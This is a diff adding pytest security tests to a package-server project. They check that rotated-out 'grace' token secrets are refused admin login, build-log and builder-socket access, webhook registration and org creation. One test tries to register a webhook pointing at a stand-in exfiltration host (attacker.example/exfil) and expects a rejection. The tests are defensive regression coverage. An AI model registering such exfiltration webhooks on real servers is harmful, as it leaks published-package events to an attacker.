@@ -533,3 +533,186 @@ class TestTokenRotateCLI:
         out = capsys.readouterr().out
         assert "cvctok_NEWSECRET" in out
         assert "Old secret valid until" in out
+
+
+# ── Grace-secret authentication-bypass fixes (DB backend) ───────
+#
+# Third security pass: three endpoints resolved the token manually
+# (bypassing require_role's fail-closed grace gate) and checked only the
+# role — so a pre-rotation grace secret could mint a durable admin
+# session, open a builder socket, or read build logs.  These lock the
+# fixes in and add coverage for control-plane endpoints whose grace
+# rejection was previously only implied by require_role's default.
+
+
+@pytest.fixture()
+def db_server_env(tmp_path, monkeypatch):
+    """DB-backed test server (orgs / webhooks / builds need the DB backend)."""
+    pytest.importorskip("aiosqlite", reason="aiosqlite required for DB tests")
+    db_url = f"sqlite+aiosqlite:///{tmp_path / 'rot_sec.db'}"
+    monkeypatch.setenv("CVCPKG_DATABASE_URL", db_url)
+    monkeypatch.delenv("CVCPKG_MIRROR_MODE", raising=False)
+
+    from fastapi.testclient import TestClient
+
+    from cvcpkg.server.app import create_app
+    from cvcpkg.server.db import create_tables, dispose_engine, init_db
+    from cvcpkg.server.db_stores import DbTokenStore
+
+    async def _seed():
+        init_db(db_url)
+        await create_tables()
+        store = DbTokenStore(tmp_path)
+        admin_raw = await store.create("test-admin", TokenRole.admin)
+        pub_raw = await store.create("test-publisher", TokenRole.publisher)
+        await dispose_engine()
+        return admin_raw, pub_raw
+
+    admin_token, pub_token = asyncio.run(_seed())
+    app = create_app(state_dir=tmp_path)
+    with TestClient(app) as client:
+        yield client, admin_token, pub_token, tmp_path
+
+
+def _make_grace_secret(client, admin_tok, name, role="publisher", grace=60):
+    """Create `name`, rotate it with grace, return (old_grace, new_current)."""
+    created = client.post(
+        "/v1/tokens",
+        json={"name": name, "role": role},
+        headers={"Authorization": f"Bearer {admin_tok}"},
+    )
+    assert created.status_code == 200, created.text
+    old = created.json()["token"]
+    rotated = client.post(
+        f"/v1/tokens/{name}/rotate",
+        json={"grace_minutes": grace},
+        headers={"Authorization": f"Bearer {old}"},
+    )
+    assert rotated.status_code == 200, rotated.text
+    return old, rotated.json()["token"]
+
+
+class TestGraceSecretAuthBypass:
+    def test_admin_login_rejects_grace_secret(self, db_server_env):
+        # CRITICAL: a grace admin secret must not mint an admin session
+        # cookie (which would outlive the grace window and grant full
+        # control-plane via the dashboard).
+        client, admin_tok, _pub, _ = db_server_env
+        old, new = _make_grace_secret(client, admin_tok, "adminlogin", role="admin")
+        # Old (grace) secret is refused a session...
+        resp = client.post("/admin/login", data={"token": old}, follow_redirects=False)
+        assert resp.status_code == 401
+        assert "cvcpkg_admin_session" not in resp.cookies
+        assert "set-cookie" not in {k.lower() for k in resp.headers}
+        # ...the current secret still logs in fine.
+        ok = client.post("/admin/login", data={"token": new}, follow_redirects=False)
+        assert ok.status_code == 303
+
+    def test_build_log_stream_rejects_grace_secret(self, db_server_env):
+        client, admin_tok, _pub, _ = db_server_env
+        old, _new = _make_grace_secret(client, admin_tok, "loguser", role="publisher")
+        resp = client.get("/v1/builds/1/log/stream", headers={"Authorization": f"Bearer {old}"})
+        assert resp.status_code == 403
+
+    def test_builder_ws_rejects_grace_secret(self, db_server_env):
+        from starlette.websockets import WebSocketDisconnect
+
+        client, admin_tok, _pub, _ = db_server_env
+        old, _new = _make_grace_secret(client, admin_tok, "wsuser", role="publisher")
+        # The socket is closed (code 4003) before the builder handshake.
+        with pytest.raises(WebSocketDisconnect):
+            with client.websocket_connect(f"/v1/builders/1/ws?token={old}") as ws:
+                ws.receive_text()
+
+
+class TestGraceSecretControlPlaneDbEndpoints:
+    """Control-plane endpoints whose grace rejection came only from
+    require_role's fail-closed default — pin it so a future refactor that
+    adds allow_grace=True (or a manual-verify path) can't silently reopen
+    a durable-foothold hole."""
+
+    def test_grace_secret_cannot_register_webhook(self, db_server_env):
+        client, admin_tok, _pub, _ = db_server_env
+        old, _new = _make_grace_secret(client, admin_tok, "hookadmin", role="admin")
+        resp = client.post(
+            "/v1/webhooks",
+            json={"url": "https://attacker.example/exfil", "events": ["package.published"]},
+            headers={"Authorization": f"Bearer {old}"},
+        )
+        assert resp.status_code == 403
+
+    def test_grace_secret_cannot_create_org(self, db_server_env):
+        client, admin_tok, _pub, _ = db_server_env
+        old, _new = _make_grace_secret(client, admin_tok, "orgmaker", role="publisher")
+        resp = client.post(
+            "/v1/orgs",
+            json={"slug": "graceorg", "display_name": "Grace Org"},
+            headers={"Authorization": f"Bearer {old}"},
+        )
+        assert resp.status_code == 403
+
+
+class TestRotationOrgMembershipAndDbEndpoint:
+    def test_org_membership_survives_rotation(self, db_server_env):
+        # The marquee value prop: membership is keyed by token NAME, which
+        # rotation preserves, so the NEW secret can still publish to the org.
+        client, admin_tok, _pub, _ = db_server_env
+        created = client.post(
+            "/v1/tokens",
+            json={"name": "orgpub", "role": "publisher"},
+            headers={"Authorization": f"Bearer {admin_tok}"},
+        )
+        secret = created.json()["token"]
+        org = client.post(
+            "/v1/orgs",
+            json={"slug": "team", "display_name": "Team"},
+            headers={"Authorization": f"Bearer {secret}"},
+        )
+        assert org.status_code in (200, 201), org.text
+        # Owner is auto-member; rotate the token (grace 0 → old secret dies).
+        rot = client.post(
+            "/v1/tokens/orgpub/rotate",
+            headers={"Authorization": f"Bearer {secret}"},
+        )
+        assert rot.status_code == 200
+        new_secret = rot.json()["token"]
+        # New secret still publishes to the org it owns.
+        pub = client.post(
+            "/v1/publish",
+            params={
+                "name": "teampkg",
+                "version": "1.0",
+                "platform": "linux",
+                "arch": "x86_64",
+                "org": "team",
+            },
+            files={"file": ("t.tar.zst", io.BytesIO(b"data"))},
+            headers={"Authorization": f"Bearer {new_secret}"},
+        )
+        assert pub.status_code == 200, pub.text
+
+    def test_rotate_endpoint_on_db_backend(self, db_server_env):
+        # The endpoint rotation suite otherwise runs only on YAML; exercise
+        # the DB path (rotate joins the transaction, response re-reads the
+        # freshly-rotated row).
+        client, admin_tok, _pub, _ = db_server_env
+        client.post(
+            "/v1/tokens",
+            json={"name": "dbrot", "role": "publisher"},
+            headers={"Authorization": f"Bearer {admin_tok}"},
+        )
+        resp = client.post(
+            "/v1/tokens/dbrot/rotate",
+            json={"grace_minutes": 30},
+            headers={"Authorization": f"Bearer {admin_tok}"},
+        )
+        assert resp.status_code == 200
+        data = resp.json()
+        assert data["role"] == "publisher"  # not the admin actor's role
+        assert data["token"].startswith("cvctok_")
+        assert data["previous_valid_until"] is not None
+        # New secret authenticates; a token_rotate audit row exists.
+        audit = client.get("/v1/audit", headers={"Authorization": f"Bearer {admin_tok}"}).json()[
+            "entries"
+        ]
+        assert any(e["action"] == "token_rotate" and e["target"] == "dbrot" for e in audit)
